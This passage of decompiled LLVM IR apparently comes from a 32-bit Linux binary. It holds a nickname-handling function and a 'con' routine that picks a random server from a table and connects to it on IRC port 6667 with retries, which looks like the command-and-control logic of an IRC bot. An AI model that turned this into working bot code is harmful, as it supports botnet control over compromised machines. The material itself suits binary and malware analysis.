  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %storemerge968, { 1, 0 }
  uselistorder i32 %v5_804a980, { 1, 2, 0, 3, 4 }
  uselistorder i8* %stack_var_-20.2, { 1, 0 }
  uselistorder i32 %stack_var_-28.2, { 2, 0, 1, 3 }
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge10, { 1, 0, 2 }
  uselistorder i32 %storemerge1171, { 1, 0 }
  uselistorder i8* %stack_var_-20.0, { 1, 0 }
  uselistorder i32 %stack_var_-28.0, { 2, 0, 1, 3 }
  uselistorder i8** @global_var_8062a88.32, { 6, 0, 5, 4, 3, 2, 1 }
  uselistorder i64* @global_var_8062a8c.33, { 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i8* %arg2, { 1, 2, 3, 0, 4, 5 }
  uselistorder label %dec_label_pc_804aa97, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_804a9bb, { 1, 0 }
  uselistorder label %dec_label_pc_804a958.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804a980, { 1, 0 }
  uselistorder label %dec_label_pc_804a8df, { 1, 0 }
  uselistorder label %dec_label_pc_804a87c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804a8a4, { 1, 0 }
}

define i32 @_433() local_unnamed_addr {
entry:
  %v0_804aaa4 = load i32, i32* @global_var_8067524.101, align 4
  %v1_804aaad = call i32 @free(i32 %v0_804aaa4)
  %v0_804aab5 = call i32 @makestring()
  store i32 %v0_804aab5, i32* @global_var_8067524.101, align 4
  ret i32 %v0_804aab5
}

define i32 @_NICK(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp19 = inttoptr i32 %arg2 to i8*
  %v4_804aad7 = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_804aad4

dec_label_pc_804aad1:                             ; preds = %dec_label_pc_804aaf3
  %v4_804aad1 = add i32 %storemerge, 1
  br label %dec_label_pc_804aad4

dec_label_pc_804aad4:                             ; preds = %entry, %dec_label_pc_804aad1
  %storemerge = phi i32 [ %v4_804aad1, %dec_label_pc_804aad1 ], [ 0, %entry ]
  store i1 false, i1* @df, align 1
  store i32 %v4_804aad7, i32* @edi, align 4
  %v3_804aae8 = call i32 @_strlen(i8* %arg1)
  %v7_804aaef = icmp ult i32 %storemerge, %v3_804aae8
  %v1_804aaf1 = icmp eq i1 %v7_804aaef, false
  %.pre = add i32 %storemerge, %v4_804aad7
  br i1 %v1_804aaf1, label %dec_label_pc_804aad4.dec_label_pc_804aaff_crit_edge, label %dec_label_pc_804aaf3

dec_label_pc_804aad4.dec_label_pc_804aaff_crit_edge: ; preds = %dec_label_pc_804aad4
  %.pre12 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_804aaff

dec_label_pc_804aaf3:                             ; preds = %dec_label_pc_804aad4
  %v1_804aaf9 = inttoptr i32 %.pre to i8*
  %v2_804aaf9 = load i8, i8* %v1_804aaf9, align 1
  %v10_804aafb = icmp eq i8 %v2_804aaf9, 33
  %v1_804aafd = icmp eq i1 %v10_804aafb, false
  br i1 %v1_804aafd, label %dec_label_pc_804aad1, label %dec_label_pc_804aaff

dec_label_pc_804aaff:                             ; preds = %dec_label_pc_804aaf3, %dec_label_pc_804aad4.dec_label_pc_804aaff_crit_edge
  %v1_804ab05.pre-phi = phi i8* [ %.pre12, %dec_label_pc_804aad4.dec_label_pc_804aaff_crit_edge ], [ %v1_804aaf9, %dec_label_pc_804aaf3 ]
  store i8 0, i8* %v1_804ab05.pre-phi, align 1
  %v0_804ab08 = load i32, i32* @global_var_8067524.101, align 4
  %v3_804ab14 = call i32 @__GI_strcasecmp(i8* %arg1, i32 %v0_804ab08)
  %v1_804ab1c = icmp eq i32 %v3_804ab14, 0
  %v1_804ab1e = icmp eq i1 %v1_804ab1c, false
  br i1 %v1_804ab1e, label %dec_label_pc_804ab59, label %dec_label_pc_804ab20

dec_label_pc_804ab20:                             ; preds = %dec_label_pc_804aaff
  %v2_804ab23 = load i8, i8* %tmp19, align 1
  %v10_804ab25 = icmp eq i8 %v2_804ab23, 58
  %v1_804ab27 = icmp eq i1 %v10_804ab25, false
  br i1 %v1_804ab27, label %dec_label_pc_804ab2c, label %dec_label_pc_804ab29

dec_label_pc_804ab29:                             ; preds = %dec_label_pc_804ab20
  %v5_804ab29 = add i32 %arg2, 1
  %v22_804ab29 = inttoptr i32 %v5_804ab29 to i8*
  br label %dec_label_pc_804ab2c

dec_label_pc_804ab2c:                             ; preds = %dec_label_pc_804ab20, %dec_label_pc_804ab29
  %stack_var_12.0 = phi i8* [ %tmp19, %dec_label_pc_804ab20 ], [ %v22_804ab29, %dec_label_pc_804ab29 ]
  %v0_804ab2c = load i32, i32* @global_var_8067524.101, align 4
  %v1_804ab31 = icmp eq i32 %v0_804ab2c, 0
  br i1 %v1_804ab31, label %dec_label_pc_804ab2c.dec_label_pc_804ab46_crit_edge, label %dec_label_pc_804ab35

dec_label_pc_804ab2c.dec_label_pc_804ab46_crit_edge: ; preds = %dec_label_pc_804ab2c
  br label %dec_label_pc_804ab46

dec_label_pc_804ab35:                             ; preds = %dec_label_pc_804ab2c
  %v1_804ab3e = call i32 @free(i32 %v0_804ab2c)
  br label %dec_label_pc_804ab46

dec_label_pc_804ab46:                             ; preds = %dec_label_pc_804ab2c.dec_label_pc_804ab46_crit_edge, %dec_label_pc_804ab35
  %v2_804ab4c = call i32 @__GI_strdup(i8* %stack_var_12.0)
  store i32 %v2_804ab4c, i32* @global_var_8067524.101, align 4
  br label %dec_label_pc_804ab59

dec_label_pc_804ab59:                             ; preds = %dec_label_pc_804aaff, %dec_label_pc_804ab46
  %v0_804ab5d = phi i32 [ %v3_804ab14, %dec_label_pc_804aaff ], [ %v2_804ab4c, %dec_label_pc_804ab46 ]
  ret i32 %v0_804ab5d

; uselistorder directives
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i8 33, { 0, 1, 3, 2, 4 }
  uselistorder i8* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ab59, { 1, 0 }
  uselistorder label %dec_label_pc_804ab46, { 1, 0 }
  uselistorder label %dec_label_pc_804ab2c, { 1, 0 }
  uselistorder label %dec_label_pc_804aad4, { 1, 0 }
}

define i32 @con() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp20 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ab5e = load i32, i32* @ebp, align 4
  store i32 %v0_804ab5e, i32* %stack_var_-4, align 4
  %v4_804ab5e = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804ab5e, i32* @ebp, align 4
  %v15_804ab61 = ptrtoint i32* %stack_var_-44 to i32
  %v2_804ac39 = ptrtoint i32* %stack_var_-32 to i32
  %v2_804ac3c = ptrtoint i32* %stack_var_-28 to i32
  %v2_804ac8e = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_804ab66

dec_label_pc_804ab66:                             ; preds = %dec_label_pc_804ab66.backedge, %entry
  %v0_804abad.pre14 = phi i32 [ %v15_804ab61, %entry ], [ %storemerge16.in, %dec_label_pc_804ab66.backedge ]
  %stack_var_-8.0 = phi i32 [ %tmp20, %entry ], [ %stack_var_-8.0.be, %dec_label_pc_804ab66.backedge ]
  store i32 -1, i32* @global_var_8067528.28, align 8
  store i32 1, i32* %stack_var_-36, align 4
  %v0_804ab77 = load i32, i32* @global_var_8062a80.81, align 128
  store i32 %v0_804ab77, i32* %eax.global-to-local, align 4
  %v1_804ab7c = icmp eq i32 %v0_804ab77, 0
  %v1_804ab7e = icmp eq i1 %v1_804ab7c, false
  br i1 %v1_804ab7e, label %dec_label_pc_804aba3, label %dec_label_pc_804ab80

dec_label_pc_804ab80:                             ; preds = %dec_label_pc_804ab66
  %v1_804ab80 = call i32 @random()
  %v0_804ab87 = load i64, i64* @global_var_805e220.120, align 8
  %v2_804ab90 = ashr i32 %v1_804ab80, 31
  %v2_804ab93 = zext i32 %v1_804ab80 to i64
  %v4_804ab93 = zext i32 %v2_804ab90 to i64
  %v5_804ab93 = mul nuw i64 %v4_804ab93, 4294967296
  %v6_804ab93 = or i64 %v5_804ab93, %v2_804ab93
  %v7_804ab93 = and i64 %v0_804ab87, 4294967295
  %v10_804ab93 = srem i64 %v6_804ab93, %v7_804ab93
  %v11_804ab93 = trunc i64 %v10_804ab93 to i32
  store i32 %v11_804ab93, i32* %edx.global-to-local, align 4
  store i32 %v11_804ab93, i32* %eax.global-to-local, align 4
  %v1_804ab97 = mul i32 %v11_804ab93, 4
  %v2_804ab97 = add i32 %v1_804ab97, ptrtoint ([2 x i8*]* @global_var_805e224.123 to i32)
  %v3_804ab97 = inttoptr i32 %v2_804ab97 to i32*
  %v4_804ab97 = load i32, i32* %v3_804ab97, align 4
  store i32 %v4_804ab97, i32* %eax.global-to-local, align 4
  store i32 %v4_804ab97, i32* @global_var_8067640.80, align 64
  %v0_804abad.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804aba3

dec_label_pc_804aba3:                             ; preds = %dec_label_pc_804ab66, %dec_label_pc_804ab80
  %v0_804abad.pre = phi i32 [ %v0_804abad.pre14, %dec_label_pc_804ab66 ], [ %v0_804abad.pre.pre, %dec_label_pc_804ab80 ]
  store i32 0, i32* @global_var_8062a80.81, align 128
  br label %dec_label_pc_804abad

dec_label_pc_804abad:                             ; preds = %dec_label_pc_804abad, %dec_label_pc_804aba3
  %v0_804abad = phi i32 [ %v1_804abbb, %dec_label_pc_804abad ], [ %v0_804abad.pre, %dec_label_pc_804aba3 ]
  %v1_804abb0 = add i32 %v0_804abad, -8
  %v2_804abb0 = inttoptr i32 %v1_804abb0 to i32*
  store i32 6, i32* %v2_804abb0, align 4
  %v1_804abb2 = add i32 %v0_804abad, -12
  %v2_804abb2 = inttoptr i32 %v1_804abb2 to i32*
  store i32 1, i32* %v2_804abb2, align 4
  %v1_804abb4 = add i32 %v0_804abad, -16
  %v2_804abb4 = inttoptr i32 %v1_804abb4 to i32*
  store i32 2, i32* %v2_804abb4, align 4
  %v0_804abb6 = load i32, i32* %stack_var_-36, align 4
  %v1_804abb6 = load i32, i32* %stack_var_-32, align 4
  %v2_804abb6 = load i32, i32* %stack_var_-28, align 4
  %v3_804abb6 = call i32 @socket(i32 %v0_804abb6, i32 %v1_804abb6, i32 %v2_804abb6)
  %v0_804abbb = load i32, i32* @esp, align 4
  %v1_804abbb = add i32 %v0_804abbb, 16
  store i32 %v3_804abb6, i32* @global_var_8067528.28, align 8
  store i32 %v3_804abb6, i32* %eax.global-to-local, align 4
  %v2_804abc8 = icmp slt i32 %v3_804abb6, 0
  br i1 %v2_804abc8, label %dec_label_pc_804abad, label %dec_label_pc_804abcc

dec_label_pc_804abcc:                             ; preds = %dec_label_pc_804abad
  %v0_804abcc = load i32, i32* @global_var_8067640.80, align 64
  store i32 %v0_804abcc, i32* %eax.global-to-local, align 4
  %v3_804abd4 = inttoptr i32 %v0_804abbb to i32*
  store i32 %v0_804abcc, i32* %v3_804abd4, align 4
  %v0_804abd5 = load i32, i32* %stack_var_-36, align 4
  %v1_804abd5 = call i32 @inet_addr(i32 %v0_804abd5)
  store i32 %v1_804abd5, i32* %eax.global-to-local, align 4
  %v0_804abda = load i32, i32* @esp, align 4
  %v1_804abdd = icmp eq i32 %v1_804abd5, 0
  br i1 %v1_804abdd, label %dec_label_pc_804abf7, label %dec_label_pc_804abe1

dec_label_pc_804abe1:                             ; preds = %dec_label_pc_804abcc
  %v0_804abe1 = load i32, i32* @global_var_8067640.80, align 64
  store i32 %v0_804abe1, i32* %eax.global-to-local, align 4
  %v3_804abe9 = inttoptr i32 %v0_804abda to i32*
  store i32 %v0_804abe1, i32* %v3_804abe9, align 4
  %v0_804abea = load i32, i32* %stack_var_-36, align 4
  %v1_804abea = call i32 @inet_addr(i32 %v0_804abea)
  store i32 %v1_804abea, i32* %eax.global-to-local, align 4
  %v0_804abef = load i32, i32* @esp, align 4
  %v10_804abf2 = icmp eq i32 %v1_804abea, -1
  %v1_804abf5 = icmp eq i1 %v10_804abf2, false
  br i1 %v1_804abf5, label %dec_label_pc_804ac57, label %dec_label_pc_804abf7

dec_label_pc_804abf7:                             ; preds = %dec_label_pc_804abe1, %dec_label_pc_804abcc
  %v0_804abfc.in = phi i32 [ %v0_804abef, %dec_label_pc_804abe1 ], [ %v0_804abda, %dec_label_pc_804abcc ]
  %v0_804abf7 = load i32, i32* @global_var_8067640.80, align 64
  store i32 %v0_804abf7, i32* %eax.global-to-local, align 4
  %v3_804abff = inttoptr i32 %v0_804abfc.in to i32*
  store i32 %v0_804abf7, i32* %v3_804abff, align 4
  %v0_804ac00 = load i32, i32* %stack_var_-36, align 4
  %v1_804ac00 = call i32 @__GI_gethostbyname(i32 %v0_804ac00)
  store i32 %v1_804ac00, i32* %eax.global-to-local, align 4
  %v0_804ac05 = load i32, i32* @esp, align 4
  %v4_804ac0b = icmp eq i32 %v1_804ac00, 0
  %v1_804ac0f = icmp eq i1 %v4_804ac0b, false
  br i1 %v1_804ac0f, label %dec_label_pc_804ac31, label %dec_label_pc_804ac11

dec_label_pc_804ac11:                             ; preds = %dec_label_pc_804abf7
  store i32 0, i32* @global_var_8067640.80, align 64
  %v0_804ac1b = load i32, i32* @global_var_8067528.28, align 8
  store i32 %v0_804ac1b, i32* %eax.global-to-local, align 4
  %v3_804ac23 = inttoptr i32 %v0_804ac05 to i32*
  store i32 %v0_804ac1b, i32* %v3_804ac23, align 4
  %v1_804ac24 = call i32 @close(i32 %v1_804ac00)
  br label %dec_label_pc_804ab66.backedge

dec_label_pc_804ab66.backedge:                    ; preds = %dec_label_pc_804ac11, %dec_label_pc_804ad73
  %storemerge = phi i32 [ %v1_804ac24, %dec_label_pc_804ac11 ], [ %v1_804ad86, %dec_label_pc_804ad73 ]
  %stack_var_-8.0.be = phi i32 [ %v1_804ac00, %dec_label_pc_804ac11 ], [ %stack_var_-8.1, %dec_label_pc_804ad73 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %storemerge16.in.in = load i32, i32* @esp, align 4
  %storemerge16.in = add i32 %storemerge16.in.in, 16
  br label %dec_label_pc_804ab66

dec_label_pc_804ac31:                             ; preds = %dec_label_pc_804abf7
  store i32 %v1_804ac00, i32* %eax.global-to-local, align 4
  %v1_804ac34 = add i32 %v1_804ac00, 12
  %v2_804ac34 = inttoptr i32 %v1_804ac34 to i32*
  %v3_804ac34 = load i32, i32* %v2_804ac34, align 4
  store i32 %v3_804ac34, i32* %edx.global-to-local, align 4
  store i32 %v1_804ac00, i32* %eax.global-to-local, align 4
  %v1_804ac42 = add i32 %v1_804ac00, 16
  %v2_804ac42 = inttoptr i32 %v1_804ac42 to i32*
  %v3_804ac42 = load i32, i32* %v2_804ac42, align 4
  store i32 %v3_804ac42, i32* %eax.global-to-local, align 4
  %v1_804ac45 = inttoptr i32 %v3_804ac42 to i32*
  %v2_804ac45 = load i32, i32* %v1_804ac45, align 4
  store i32 %v2_804ac45, i32* %eax.global-to-local, align 4
  %v2_804ac4a = add i32 %v0_804ac05, 8
  %v3_804ac4a = inttoptr i32 %v2_804ac4a to i32*
  store i32 %v3_804ac34, i32* %v3_804ac4a, align 4
  %v2_804ac4b = add i32 %v0_804ac05, 4
  %v3_804ac4b = inttoptr i32 %v2_804ac4b to i32*
  store i32 %v2_804ac3c, i32* %v3_804ac4b, align 4
  %v0_804ac4c = load i32, i32* %eax.global-to-local, align 4
  %v3_804ac4c = inttoptr i32 %v0_804ac05 to i32*
  store i32 %v0_804ac4c, i32* %v3_804ac4c, align 4
  %v1_804ac4d = load i32, i32* %stack_var_-4, align 4
  %v2_804ac4d = load i32, i32* %stack_var_0, align 4
  %v3_804ac4d = call i32 @bcopy(i32 %v1_804ac00, i32 %v1_804ac4d, i32 %v2_804ac4d)
  store i32 %v3_804ac4d, i32* %eax.global-to-local, align 4
  %v0_804ac52 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ac6b

dec_label_pc_804ac57:                             ; preds = %dec_label_pc_804abe1
  %v0_804ac57 = load i32, i32* @global_var_8067640.80, align 64
  store i32 %v0_804ac57, i32* %eax.global-to-local, align 4
  %v3_804ac5f = inttoptr i32 %v0_804abef to i32*
  store i32 %v0_804ac57, i32* %v3_804ac5f, align 4
  %v1_804ac60 = call i32 @inet_addr(i32 %stack_var_-8.0)
  store i32 %v1_804ac60, i32* %eax.global-to-local, align 4
  %v0_804ac65 = load i32, i32* @esp, align 4
  store i32 %v1_804ac60, i32* %stack_var_-28, align 4
  br label %dec_label_pc_804ac6b

dec_label_pc_804ac6b:                             ; preds = %dec_label_pc_804ac31, %dec_label_pc_804ac57
  %v0_804ac71.in = phi i32 [ %v0_804ac52, %dec_label_pc_804ac31 ], [ %v0_804ac65, %dec_label_pc_804ac57 ]
  %stack_var_-8.1 = phi i32 [ %v1_804ac00, %dec_label_pc_804ac31 ], [ %stack_var_-8.0, %dec_label_pc_804ac57 ]
  store i32 2, i32* %stack_var_-32, align 4
  %v2_804ac74 = inttoptr i32 %v0_804ac71.in to i32*
  store i32 6667, i32* %v2_804ac74, align 4
  %v0_804ac79 = load i32, i32* %stack_var_-32, align 4
  %v1_804ac79 = call i32 @htons(i32 %v0_804ac79)
  %v0_804ac7e = load i32, i32* @esp, align 4
  %v0_804ac85 = load i32, i32* @global_var_8067528.28, align 8
  store i32 %v0_804ac85, i32* %edx.global-to-local, align 4
  store i32 %v2_804ac8e, i32* %eax.global-to-local, align 4
  %v2_804ac91 = add i32 %v0_804ac7e, 8
  %v3_804ac91 = inttoptr i32 %v2_804ac91 to i32*
  store i32 %v2_804ac8e, i32* %v3_804ac91, align 4
  %v1_804ac92 = add i32 %v0_804ac7e, 4
  %v2_804ac92 = inttoptr i32 %v1_804ac92 to i32*
  store i32 21537, i32* %v2_804ac92, align 4
  %v0_804ac97 = load i32, i32* %edx.global-to-local, align 4
  %v3_804ac97 = inttoptr i32 %v0_804ac7e to i32*
  store i32 %v0_804ac97, i32* %v3_804ac97, align 4
  %sext = mul i32 %v1_804ac79, 65536
  %v1_804ac98 = sdiv i32 %sext, 65536
  %v4_804ac98 = call i32 @ioctl(i32 %v1_804ac98, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804ac98, i32* %eax.global-to-local, align 4
  %v0_804ac9d = load i32, i32* @esp, align 4
  %v2_804aca3 = inttoptr i32 %v0_804ac9d to i32*
  store i32 0, i32* %v2_804aca3, align 4
  %v2_804aca5 = inttoptr i32 %v1_804ac98 to i32*
  %v3_804aca5 = call i32 @__GI_time(i32* %v2_804aca5)
  store i32 %v3_804aca5, i32* %eax.global-to-local, align 4
  %v1_804ad5f = inttoptr i32 %v3_804aca5 to i32*
  br label %dec_label_pc_804ad5a

dec_label_pc_804acb5:                             ; preds = %dec_label_pc_804ad5a
  %v1_804acb5 = call i32 @__errno_location(i32 %v3_804aca5)
  %v1_804acba = inttoptr i32 %v1_804acb5 to i32*
  store i32 0, i32* %v1_804acba, align 4
  store i32 %v2_804ac39, i32* %eax.global-to-local, align 4
  %v0_804acc3 = load i32, i32* @global_var_8067528.28, align 8
  store i32 %v0_804acc3, i32* %edx.global-to-local, align 4
  %v0_804acc9 = load i32, i32* @esp, align 4
  %v1_804accc = add i32 %v0_804acc9, -8
  %v2_804accc = inttoptr i32 %v1_804accc to i32*
  store i32 16, i32* %v2_804accc, align 4
  %v2_804acce = add i32 %v0_804acc9, -12
  %v3_804acce = inttoptr i32 %v2_804acce to i32*
  store i32 %v2_804ac39, i32* %v3_804acce, align 4
  %v0_804accf = load i32, i32* %edx.global-to-local, align 4
  %v2_804accf = add i32 %v0_804acc9, -16
  %v3_804accf = inttoptr i32 %v2_804accf to i32*
  store i32 %v0_804accf, i32* %v3_804accf, align 4
  %v2_804acd0 = load i32, i32* %stack_var_-4, align 4
  %v3_804acd0 = call i32 @connect(i32 %v3_804aca5, i32 %stack_var_-8.1, i32 %v2_804acd0)
  store i32 %v3_804acd0, i32* %eax.global-to-local, align 4
  %v0_804acd5 = load i32, i32* @esp, align 4
  %v1_804acd5 = add i32 %v0_804acd5, 16
  %v1_804acd8 = icmp eq i32 %v3_804acd0, 0
  br i1 %v1_804acd8, label %dec_label_pc_804ace8, label %dec_label_pc_804acdc

dec_label_pc_804acdc:                             ; preds = %dec_label_pc_804acb5
  %v1_804acdc = call i32 @__errno_location(i32 %v3_804aca5)
  store i32 %v1_804acdc, i32* %eax.global-to-local, align 4
  %v1_804ace1 = inttoptr i32 %v1_804acdc to i32*
  %v2_804ace1 = load i32, i32* %v1_804ace1, align 4
  store i32 %v2_804ace1, i32* %eax.global-to-local, align 4
  %v9_804ace3 = icmp eq i32 %v2_804ace1, 106
  %v1_804ace6 = icmp eq i1 %v9_804ace3, false
  br i1 %v1_804ace6, label %dec_label_pc_804ad35, label %dec_label_pc_804acdc.dec_label_pc_804ace8_crit_edge

dec_label_pc_804acdc.dec_label_pc_804ace8_crit_edge: ; preds = %dec_label_pc_804acdc
  %v0_804aced.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ace8

dec_label_pc_804ace8:                             ; preds = %dec_label_pc_804acb5, %dec_label_pc_804acdc.dec_label_pc_804ace8_crit_edge
  %v0_804aced = phi i32 [ %v0_804aced.pre, %dec_label_pc_804acdc.dec_label_pc_804ace8_crit_edge ], [ %v1_804acd5, %dec_label_pc_804acb5 ]
  %v0_804ace8 = load i32, i32* @global_var_8067528.28, align 8
  store i32 %v0_804ace8, i32* %eax.global-to-local, align 4
  %v1_804acf0 = add i32 %v0_804aced, -16
  %v2_804acf0 = inttoptr i32 %v1_804acf0 to i32*
  store i32 0, i32* %v2_804acf0, align 4
  %v1_804acf2 = add i32 %v0_804aced, -20
  %v2_804acf2 = inttoptr i32 %v1_804acf2 to i32*
  store i32 0, i32* %v2_804acf2, align 4
  %v1_804acf4 = add i32 %v0_804aced, -24
  %v2_804acf4 = inttoptr i32 %v1_804acf4 to i32*
  store i32 13, i32* %v2_804acf4, align 4
  %v1_804acf6 = add i32 %v0_804aced, -28
  %v2_804acf6 = inttoptr i32 %v1_804acf6 to i32*
  store i32 1, i32* %v2_804acf6, align 4
  %v0_804acf8 = load i32, i32* %eax.global-to-local, align 4
  %v2_804acf8 = add i32 %v0_804aced, -32
  %v3_804acf8 = inttoptr i32 %v2_804acf8 to i32*
  store i32 %v0_804acf8, i32* %v3_804acf8, align 4
  %v2_804acf9 = load i32, i32* %stack_var_-4, align 4
  %v3_804acf9 = load i32, i32* %stack_var_0, align 4
  %v5_804acf9 = call i32 @__GI_setsockopt(i32 %v3_804aca5, i32 %stack_var_-8.1, i32 %v2_804acf9, i32 %v3_804acf9, i32 ptrtoint (i32* @0 to i32))
  %v0_804acfe = load i32, i32* @esp, align 4
  %v0_804ad01 = load i32, i32* @global_var_8067528.28, align 8
  store i32 %v0_804ad01, i32* %eax.global-to-local, align 4
  %v1_804ad09 = add i32 %v0_804acfe, 16
  %v2_804ad09 = inttoptr i32 %v1_804ad09 to i32*
  store i32 0, i32* %v2_804ad09, align 4
  %v1_804ad0b = add i32 %v0_804acfe, 12
  %v2_804ad0b = inttoptr i32 %v1_804ad0b to i32*
  store i32 0, i32* %v2_804ad0b, align 4
  %v1_804ad0d = add i32 %v0_804acfe, 8
  %v2_804ad0d = inttoptr i32 %v1_804ad0d to i32*
  store i32 2, i32* %v2_804ad0d, align 4
  %v1_804ad0f = add i32 %v0_804acfe, 4
  %v2_804ad0f = inttoptr i32 %v1_804ad0f to i32*
  store i32 1, i32* %v2_804ad0f, align 4
  %v0_804ad11 = load i32, i32* %eax.global-to-local, align 4
  %v3_804ad11 = inttoptr i32 %v0_804acfe to i32*
  store i32 %v0_804ad11, i32* %v3_804ad11, align 4
  %v2_804ad12 = load i32, i32* %stack_var_-4, align 4
  %v3_804ad12 = load i32, i32* %stack_var_0, align 4
  %v5_804ad12 = call i32 @__GI_setsockopt(i32 %v3_804aca5, i32 %stack_var_-8.1, i32 %v2_804ad12, i32 %v3_804ad12, i32 ptrtoint (i32* @0 to i32))
  %v0_804ad17 = load i32, i32* @esp, align 4
  %v0_804ad1a = load i32, i32* @global_var_8067528.28, align 8
  store i32 %v0_804ad1a, i32* %eax.global-to-local, align 4
  %v1_804ad22 = add i32 %v0_804ad17, 16
  %v2_804ad22 = inttoptr i32 %v1_804ad22 to i32*
  store i32 0, i32* %v2_804ad22, align 4
  %v1_804ad24 = add i32 %v0_804ad17, 12
  %v2_804ad24 = inttoptr i32 %v1_804ad24 to i32*
  store i32 0, i32* %v2_804ad24, align 4
  %v1_804ad26 = add i32 %v0_804ad17, 8
  %v2_804ad26 = inttoptr i32 %v1_804ad26 to i32*
  store i32 9, i32* %v2_804ad26, align 4
  %v1_804ad28 = add i32 %v0_804ad17, 4
  %v2_804ad28 = inttoptr i32 %v1_804ad28 to i32*
  store i32 1, i32* %v2_804ad28, align 4
  %v0_804ad2a = load i32, i32* %eax.global-to-local, align 4
  %v3_804ad2a = inttoptr i32 %v0_804ad17 to i32*
  store i32 %v0_804ad2a, i32* %v3_804ad2a, align 4
  %v2_804ad2b = load i32, i32* %stack_var_-4, align 4
  %v3_804ad2b = load i32, i32* %stack_var_0, align 4
  %v5_804ad2b = call i32 @__GI_setsockopt(i32 %v3_804aca5, i32 %stack_var_-8.1, i32 %v2_804ad2b, i32 %v3_804ad2b, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804ad2b, i32* %eax.global-to-local, align 4
  %v2_804ad93 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ad93, i32* @ebp, align 4
  ret i32 %v5_804ad2b

dec_label_pc_804ad35:                             ; preds = %dec_label_pc_804acdc
  %v1_804ad35 = call i32 @__errno_location(i32 %v3_804aca5)
  store i32 %v1_804ad35, i32* %eax.global-to-local, align 4
  %v1_804ad3a = inttoptr i32 %v1_804ad35 to i32*
  %v2_804ad3a = load i32, i32* %v1_804ad3a, align 4
  store i32 %v2_804ad3a, i32* %eax.global-to-local, align 4
  %v9_804ad3c = icmp eq i32 %v2_804ad3a, 115
  br i1 %v9_804ad3c, label %dec_label_pc_804ad4d, label %dec_label_pc_804ad41

dec_label_pc_804ad41:                             ; preds = %dec_label_pc_804ad35
  %v1_804ad41 = call i32 @__errno_location(i32 %v3_804aca5)
  store i32 %v1_804ad41, i32* %eax.global-to-local, align 4
  %v1_804ad46 = inttoptr i32 %v1_804ad41 to i32*
  %v2_804ad46 = load i32, i32* %v1_804ad46, align 4
  store i32 %v2_804ad46, i32* %eax.global-to-local, align 4
  %v9_804ad48 = icmp eq i32 %v2_804ad46, 114
  %v1_804ad4b = icmp eq i1 %v9_804ad48, false
  br i1 %v1_804ad4b, label %dec_label_pc_804ad41.dec_label_pc_804ad73_crit_edge, label %dec_label_pc_804ad4d

dec_label_pc_804ad41.dec_label_pc_804ad73_crit_edge: ; preds = %dec_label_pc_804ad41
  %v0_804ad82.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ad73

dec_label_pc_804ad4d:                             ; preds = %dec_label_pc_804ad41, %dec_label_pc_804ad35
  %v0_804ad4d = load i32, i32* @esp, align 4
  %v1_804ad50 = add i32 %v0_804ad4d, -16
  %v2_804ad50 = inttoptr i32 %v1_804ad50 to i32*
  store i32 1, i32* %v2_804ad50, align 4
  %v1_804ad52 = call i32 @sleep(i32 %v3_804aca5)
  store i32 %v1_804ad52, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ad5a

dec_label_pc_804ad5a:                             ; preds = %dec_label_pc_804ac6b, %dec_label_pc_804ad4d
  %storemerge4.in.in = load i32, i32* @esp, align 4
  %v2_804ad5d = inttoptr i32 %storemerge4.in.in to i32*
  store i32 0, i32* %v2_804ad5d, align 4
  %v2_804ad5f = call i32 @__GI_time(i32* %v1_804ad5f)
  %v0_804ad64 = load i32, i32* @esp, align 4
  %v1_804ad64 = add i32 %v0_804ad64, 16
  %v5_804ad67 = sub i32 %v2_804ad5f, %v3_804aca5
  store i32 %v5_804ad67, i32* %eax.global-to-local, align 4
  %tmp45 = icmp ult i32 %v5_804ad67, 10
  br i1 %tmp45, label %dec_label_pc_804acb5, label %dec_label_pc_804ad73

dec_label_pc_804ad73:                             ; preds = %dec_label_pc_804ad5a, %dec_label_pc_804ad41.dec_label_pc_804ad73_crit_edge
  %v0_804ad82 = phi i32 [ %v0_804ad82.pre, %dec_label_pc_804ad41.dec_label_pc_804ad73_crit_edge ], [ %v1_804ad64, %dec_label_pc_804ad5a ]
  store i32 0, i32* @global_var_8067640.80, align 64
  %v0_804ad7d = load i32, i32* @global_var_8067528.28, align 8
  store i32 %v0_804ad7d, i32* %eax.global-to-local, align 4
  %v2_804ad85 = add i32 %v0_804ad82, -16
  %v3_804ad85 = inttoptr i32 %v2_804ad85 to i32*
  store i32 %v0_804ad7d, i32* %v3_804ad85, align 4
  %v1_804ad86 = call i32 @close(i32 %v3_804aca5)
  br label %dec_label_pc_804ab66.backedge

; uselistorder directives
  uselistorder i32 %v0_804aced, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v3_804aca5, { 3, 10, 5, 4, 6, 0, 1, 2, 7, 8, 9, 11, 12 }
  uselistorder i32 %v1_804ac98, { 1, 0 }
